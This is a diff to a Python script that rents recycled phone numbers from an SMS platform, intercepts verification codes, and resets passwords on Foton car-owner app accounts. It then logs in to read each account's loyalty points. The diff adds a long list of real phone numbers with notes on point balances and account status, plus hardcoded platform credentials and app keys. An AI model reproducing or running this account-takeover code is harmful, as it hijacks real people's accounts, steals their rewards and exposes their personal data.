@@ -377,9 +377,10 @@ class YeziPlatform:
         params = {
             'token': self.token,
             'project_id': self.project_id,
-            # 'scope': "131"
-            # 'scope_black':"192"
-            # 'scope': "130,190,136,131"
+            #'scope': "185"
+            #'scope': "130,131,136,171,190"
+            'scope_black':"192,188,159,187,158,152,167,165,181,180,177,173"
+            #'scope_black':"192,165"
         }
         
         # 添加可选参数
@@ -544,10 +545,171 @@ def main():
     # 配置参数
     username = "18736805971"#椰子账号
     password = "zxcvbnm0129."#椰子密码
-    project_id = "865765"
-    target_success_count = 26  # 需要成功修改密码的手机号数量
+    project_id = "865765" #已跑：----55Z7TD #865765
+    target_success_count = 5  # 需要成功修改密码的手机号数量
     current_success_count = 0
     successful_phones = []  # 用于存储成功完成的手机号
+    query_integral = 1 # 是否查询积分
+    update_password = 'stars123456' #修改后的密码
+    # 已检测过的手机号 能登录1 跑着1 在线1 #1 0 0 #1 0 1
+    detection_phone = [
+        '17718134914',#1 1 1
+        '15105652539',#1 1 1
+        '17354014010',#1 0 0
+        '17354189244',#1 1 0
+        '19956003446',#1 1 0
+        '17719484291',#1 1 0
+        '17333263531',#0 0 0
+        '13265626739',#0 1 1
+        '18919684425',#1 1 0
+        '17756071402',#1 1 0
+        '17356504874',#1 0 0
+        '17756582704',#1 0 0
+        '13168079319',#0 1 1
+        '17305602574',#1 1 0
+        '17354020514',#1 1 1
+        '17756590704',#1 1 1
+        '18955170632',#1 1 0
+        '17354043347',#1 1 1
+        '17764432371',#1 1 0
+        '17719472145',#1 1 1
+        '17352965724',#1 1 1
+        '13129543575',#0 0 1
+        '13113862042',#0 1 1
+        '17705691024',#1 1 1
+        '17368873440',#1 1 1
+        '17309694419',#1 1 1
+        '17775321754',#1 0 0
+        '17756074414',#1 1 1
+        '17352969774',#1 1 1
+        '19965051744',#1 1 1
+        '17764435909',#0 1 1
+        '17354078213',#1 0 1
+        '17354034294',#1 0 0
+        '17764461145',#1 1 1
+        '13402000533',#0 1 1
+        '19155147129',#1 1 1
+        '19966143044',#1 1 1
+        '13329014425',#1 1 0
+        '18955181729',#0 1 1
+        '13395601436',#1 1 0
+        '13144839059',#1 0 1
+        '13143443093',#0 1 1
+        '15156212038',#0 1 1
+        '13267053034',#1 0 1
+        '17354091414',#0 1 1
+        '18155154649',#1 1 1
+        '18110406412',#0 1 1
+        '18721434801',#0 0 1
+        '17354127873',#0 1 1
+        '15315376694',#0 1 1
+        '15375360453',#0 1 1
+        '17719492085',#1 1 1
+        '15900616954',#0 1 1
+        '17333216417',#1 1 1
+        '13524506232',#0 1 1
+        '17352961423',#0 1 1
+        '17305605247',#0 1 1
+        '18119633792',#0 1 1
+        '13097274757',#0 1 0
+        '18579207388',#13000 已注销更换手机
+        '17318578445',#1 1 1
+        '13037279175',
+        '18110407943',
+        '18154121249',
+        '17821832945',
+        '18119680840',
+        '13058147830',
+        '13641794464',#1228
+        '13764555292',#1348
+        '13524502110',
+        '13524501556',
+        '13113862744',
+        '18721440079',
+        '19821922783',
+        '15395039841',
+        '17333239814',
+        '17821837824',
+        '17354084144',
+        '15357934462',
+        '13524440956',
+        '17115740268',
+        '13524379289',
+        '18321883317',#1 0 0
+        '18721417807',
+        '13144826031',
+        '13147086928',
+        '13144806237',
+        '13048911764',
+        '17137518306',
+        '17179128464',# 14000 未注销更换手机
+        '17115740267',
+        '13189724373',
+        '13043483324',
+        '13164758105',
+        '13143421509',
+        '17821824963',# 积分
+        '17179128434',
+        '17175835687',
+        '13524506289',
+        '13027967445',
+        '17179127841',#15000 已注销更换手机
+        '17173455306',
+        '13500511434',
+        '15375403431',#25556
+        '18321045746',
+        '17170586751',
+        '15000848629',
+        '13246791016',
+        '13764557515',
+        '19056887370',
+        '17179128419',
+        '15324403650', 
+        '13145895139',
+        '13524396943',
+        '13524740759',
+        '18321332934',
+        '17178963046',#1496
+        '17821984985',
+        '13764555561',
+        '17137687043',#1396
+        '13524385738',
+        '17821011723',
+        '13189747917',
+        '17136618656',#2796
+        '17178962411',#1496
+        '17136618739',#1496
+        '13349203874',
+        '13242097946',
+        '19055151934',
+        '19821919091',
+        '13524501748',
+        '17153156230',#1486
+        '19556559973',
+        '13524501492',#黑
+        '17821834120',#黑
+        '13764553791',#黑
+        '17179128476',#15072
+        '13246790435',#黑
+        '19965026104',
+        '13402049455',#黑
+        '17821955945',#黑
+        '17175835719',#1496
+        '17173452615',#1496
+        '19556559132',
+        '13355650984',
+        '15056995462',
+        '17178964198',#1496
+        '13027964744',#黑
+        '15056987434',
+        '17821833642',#黑
+        '17191013824',#1496
+        '19056887361',
+        '15375083482',
+        '13524501467',#黑
+        '17178965543',#1496
+        '13402037533',
+    ]
     
     # 初始化椰子平台
     yezi = YeziPlatform(username, password, project_id)
@@ -561,40 +723,14 @@ def main():
                 time.sleep(3)
                 continue
 
-            # 开始号段过滤功能
-            # 定义需要过滤的号段列表
-            filtered_prefixes = ['192', '190', '165', '167']  # 需要过滤的号段
-            should_filter = False
-            
-            # 检查手机号前3位是否在过滤列表中
-            for prefix in filtered_prefixes:
-                if phone_number.startswith(prefix):
-                    logger.warning(f"手机号 {phone_number} 号段为{prefix}，需要过滤，释放并重新获取")
-                    should_filter = True
-                    break
-            
-            if should_filter:
-                yezi.free_mobile(phone_number)
-                time.sleep(3)
-                continue
-
-            # 过滤掉特定前缀的手机号
-            filtered_prefixes = ['1718531', '1719']  # 需要过滤的前缀列表 18120
-            should_filter = False
-
-            for prefix in filtered_prefixes:
-                if phone_number.startswith(prefix):
-                    logger.warning(f"手机号 {phone_number} 前缀为{prefix}，需要过滤，释放并重新获取")
-                    should_filter = True
-                    break
-            
-            if should_filter:
-                yezi.free_mobile(phone_number)
-                time.sleep(3)
-                continue
-            # 结束号段过滤
-
             logger.info(f"获取到手机号: {phone_number}")
+            
+            # 检测获取到的手机号是否在detection_phone数组中
+            if phone_number in detection_phone:
+                logger.info(f"手机号 {phone_number} 已在检测列表中，跳过并重新获取")
+                yezi.free_mobile(phone_number)
+                time.sleep(3)
+                continue
             
             # 初始化验证器
             verifier = FotonVerifier(phone_number)
@@ -616,7 +752,7 @@ def main():
                     # 构建修改密码请求
                     update_data = {
                         "memberId": "",
-                        "password": "xixi187615",#要修改的手机号
+                        "password": update_password, #"stars123",#要修改的手机号
                         "smsCode": sms_result.get("verification_code"),
                         "ip": "127.0.0.1",
                         "tel": phone_number
@@ -655,144 +791,146 @@ def main():
         logger.info(f"成功完成的手机号列表: {','.join(successful_phones)}")
 
         # 添加积分查询功能
-        from dataclasses import dataclass
-        from typing import Optional
-        
-        @dataclass
-        class LoginResult:
-            token: Optional[str] = None
-            memberId: Optional[str] = None
-            uid: Optional[str] = None
-            phone: Optional[str] = None
+        if query_integral == 1:
 
-        def login(phone: str, password: str) -> LoginResult:
-            url = "https://czyl.foton.com.cn/ehomes-new/homeManager/getLoginMember"
-            body = {
-                "version_name": "",
-                "checkCode": "",
-                "redisCheckCodeKey": "",
-                "deviceSystem": "17.2.1",
-                "version_auth": "VLQJq+FS9pSFabxQgcaDhA==",
-                "device_type": "0",
-                "password": password,
-                "ip": "127.0.0.1",
-                "device_id": "7AD11E8D-EC8F-4194-939F-BE62704DCFB7",
-                "version_code": "0",
-                "name": phone,
-                "device_model": "iPhone13,4"
-            }
+            from dataclasses import dataclass
+            from typing import Optional
+            
+            @dataclass
+            class LoginResult:
+                token: Optional[str] = None
+                memberId: Optional[str] = None
+                uid: Optional[str] = None
+                phone: Optional[str] = None
 
-            headers = {
-                "Content-Type": "application/json",
-                "User-Agent": "Feature_Alimighty/7.4.9 (iPhone; iOS 17.2.1; Scale/3.00)"
-            }
-            
-            # 增加重试机制
-            max_retries = 3
-            retry_delay = 5
-            timeout_value = 15  # 增加超时时间到15秒
-            
-            for attempt in range(max_retries):
-                try:
-                    response = requests.post(url, json=body, headers=headers, timeout=timeout_value)
-                    resp_json = response.json()
+            def login(phone: str, password: str) -> LoginResult:
+                url = "https://czyl.foton.com.cn/ehomes-new/homeManager/getLoginMember"
+                body = {
+                    "version_name": "",
+                    "checkCode": "",
+                    "redisCheckCodeKey": "",
+                    "deviceSystem": "17.2.1",
+                    "version_auth": "VLQJq+FS9pSFabxQgcaDhA==",
+                    "device_type": "0",
+                    "password": password,
+                    "ip": "127.0.0.1",
+                    "device_id": "7AD11E8D-EC8F-4194-939F-BE62704DCFB7",
+                    "version_code": "0",
+                    "name": phone,
+                    "device_model": "iPhone13,4"
+                }
+
+                headers = {
+                    "Content-Type": "application/json",
+                    "User-Agent": "Feature_Alimighty/7.4.9 (iPhone; iOS 17.2.1; Scale/3.00)"
+                }
                 
-                    if resp_json.get("code") != 200:
-                        return LoginResult()
+                # 增加重试机制
+                max_retries = 3
+                retry_delay = 5
+                timeout_value = 15  # 增加超时时间到15秒
                 
-                    data = resp_json.get("data", {})
-                    return LoginResult(
-                        token=data.get("token"),
-                        memberId=data.get("memberID"),
-                        uid=data.get("uid"),
-                        phone=data.get("tel")
-                    )
-                except (requests.exceptions.ReadTimeout, requests.exceptions.ConnectionError) as e:
-                    logger.warning(f"登录请求超时或连接错误，尝试第{attempt+1}次重试: {str(e)}")
-                    if attempt < max_retries - 1:  # 如果不是最后一次尝试
-                        time.sleep(retry_delay)  # 等待一段时间再重试
-                    else:
-                        logger.error(f"登录请求失败，已达到最大重试次数: {str(e)}")
-                        return LoginResult()
-                except Exception as e:
-                    logger.error(f"登录过程中发生未知错误: {str(e)}")
-                    return LoginResult()
-
-        def query_points(login: LoginResult) -> dict:
-            url = "https://czyl.foton.com.cn/ehomes-new/homeManager/api/Member/findMemberPointsInfo"
-            body = {
-                "memberId": login.memberId,
-                "userId": login.uid,
-                "userType": "61",
-                "uid": login.uid,
-                "mobile": login.phone,
-                "tel": login.phone,
-                "phone": login.phone,
-                "brandName": "",
-                "seriesName": "",
-                "token": login.token,
-                "safeEnc": int(time.time() * 1000) - 2022020200,
-                "businessId": 1
-            }
-
-            headers = {
-                "Content-Type": "application/json;charset=utf-8",
-                "Connection": "Keep-Alive",
-                "app-key": "7918d2d1a92a02cbc577adb8d570601e72d3b640",
-                "app-token": "58891364f56afa1b6b7dae3e4bbbdfbfde9ef489",
-                "User-Agent": "web",
-                "Accept-Encoding": "gzip"
-            }
-            
-            # 增加重试机制
-            max_retries = 3
-            retry_delay = 5
-            timeout_value = 15  # 增加超时时间到15秒
-            
-            for attempt in range(max_retries):
-                try:
-                    response = requests.post(url, json=body, headers=headers, timeout=timeout_value)
-                    return response.json()
-                except (requests.exceptions.ReadTimeout, requests.exceptions.ConnectionError) as e:
-                    logger.warning(f"请求超时或连接错误，尝试第{attempt+1}次重试: {str(e)}")
-                    if attempt < max_retries - 1:  # 如果不是最后一次尝试
-                        time.sleep(retry_delay)  # 等待一段时间再重试
-                    else:
-                        logger.error(f"请求失败，已达到最大重试次数: {str(e)}")
-                        return {"code": -1, "message": f"请求超时: {str(e)}"}
-                except Exception as e:
-                    logger.error(f"请求过程中发生未知错误: {str(e)}")
-                    return {"code": -1, "message": f"未知错误: {str(e)}"}
-        
-        # 为每个成功的手机号查询积分
-        for phone in successful_phones:
-            password = "xixi187615"  # 使用修改后的密码
-            max_login_attempts = 2
-            
-            for login_attempt in range(max_login_attempts):
-                login_result = login(phone, password)
-                
-                if login_result.token:
+                for attempt in range(max_retries):
                     try:
-                        points_info = query_points(login_result)
-                        if points_info.get("code") == -1:  # 自定义错误码
-                            logger.error(f"手机号 {phone} 查询积分失败: {points_info.get('message')}")
+                        response = requests.post(url, json=body, headers=headers, timeout=timeout_value)
+                        resp_json = response.json()
+                    
+                        if resp_json.get("code") != 200:
+                            return LoginResult()
+                    
+                        data = resp_json.get("data", {})
+                        return LoginResult(
+                            token=data.get("token"),
+                            memberId=data.get("memberID"),
+                            uid=data.get("uid"),
+                            phone=data.get("tel")
+                        )
+                    except (requests.exceptions.ReadTimeout, requests.exceptions.ConnectionError) as e:
+                        logger.warning(f"登录请求超时或连接错误，尝试第{attempt+1}次重试: {str(e)}")
+                        if attempt < max_retries - 1:  # 如果不是最后一次尝试
+                            time.sleep(retry_delay)  # 等待一段时间再重试
                         else:
-                            logger.info(f"手机号 {phone} 的积分信息: {points_info}")
-                        break  # 成功获取积分信息，跳出重试循环
+                            logger.error(f"登录请求失败，已达到最大重试次数: {str(e)}")
+                            return LoginResult()
                     except Exception as e:
-                        logger.error(f"处理积分信息时出错: {str(e)}")
-                        if login_attempt < max_login_attempts - 1:
-                            logger.info(f"将在5秒后重试查询手机号 {phone} 的积分")
-                            time.sleep(5)
-                else:
-                    logger.error(f"手机号 {phone} 登录失败，无法查询积分")
-                    if login_attempt < max_login_attempts - 1:
-                        logger.info(f"将在5秒后重试登录手机号 {phone}")
-                        time.sleep(5)
+                        logger.error(f"登录过程中发生未知错误: {str(e)}")
+                        return LoginResult()
+
+            def query_points(login: LoginResult) -> dict:
+                url = "https://czyl.foton.com.cn/ehomes-new/homeManager/api/Member/findMemberPointsInfo"
+                body = {
+                    "memberId": login.memberId,
+                    "userId": login.uid,
+                    "userType": "61",
+                    "uid": login.uid,
+                    "mobile": login.phone,
+                    "tel": login.phone,
+                    "phone": login.phone,
+                    "brandName": "",
+                    "seriesName": "",
+                    "token": login.token,
+                    "safeEnc": int(time.time() * 1000) - 2022020200,
+                    "businessId": 1
+                }
+
+                headers = {
+                    "Content-Type": "application/json;charset=utf-8",
+                    "Connection": "Keep-Alive",
+                    "app-key": "7918d2d1a92a02cbc577adb8d570601e72d3b640",
+                    "app-token": "58891364f56afa1b6b7dae3e4bbbdfbfde9ef489",
+                    "User-Agent": "web",
+                    "Accept-Encoding": "gzip"
+                }
+                
+                # 增加重试机制
+                max_retries = 3
+                retry_delay = 5
+                timeout_value = 15  # 增加超时时间到15秒
+                
+                for attempt in range(max_retries):
+                    try:
+                        response = requests.post(url, json=body, headers=headers, timeout=timeout_value)
+                        return response.json()
+                    except (requests.exceptions.ReadTimeout, requests.exceptions.ConnectionError) as e:
+                        logger.warning(f"请求超时或连接错误，尝试第{attempt+1}次重试: {str(e)}")
+                        if attempt < max_retries - 1:  # 如果不是最后一次尝试
+                            time.sleep(retry_delay)  # 等待一段时间再重试
+                        else:
+                            logger.error(f"请求失败，已达到最大重试次数: {str(e)}")
+                            return {"code": -1, "message": f"请求超时: {str(e)}"}
+                    except Exception as e:
+                        logger.error(f"请求过程中发生未知错误: {str(e)}")
+                        return {"code": -1, "message": f"未知错误: {str(e)}"}
             
-                    # 无论成功与否，在处理下一个手机号前稍作延迟
-                    time.sleep(3)  # 避免请求过于频繁
+            # 为每个成功的手机号查询积分
+            for phone in successful_phones:
+                password = update_password #"stars123"  # 使用修改后的密码
+                max_login_attempts = 1
+                
+                for login_attempt in range(max_login_attempts):
+                    login_result = login(phone, password)
+                    
+                    if login_result.token:
+                        try:
+                            points_info = query_points(login_result)
+                            if points_info.get("code") == -1:  # 自定义错误码
+                                logger.error(f"手机号 {phone} 查询积分失败: {points_info.get('message')}")
+                            else:
+                                logger.info(f"手机号 {phone} 的积分信息: {points_info}")
+                            break  # 成功获取积分信息，跳出重试循环
+                        except Exception as e:
+                            logger.error(f"处理积分信息时出错: {str(e)}")
+                            if login_attempt < max_login_attempts - 1:
+                                logger.info(f"将在5秒后重试查询手机号 {phone} 的积分")
+                                time.sleep(5)
+                    else:
+                        logger.error(f"手机号 {phone} 登录失败，无法查询积分")
+                        if login_attempt < max_login_attempts - 1:
+                            logger.info(f"将在5秒后重试登录手机号 {phone}")
+                            time.sleep(5)
+                
+                        # 无论成功与否，在处理下一个手机号前稍作延迟
+                        time.sleep(3)  # 避免请求过于频繁
 
 if __name__ == "__main__":
     main()
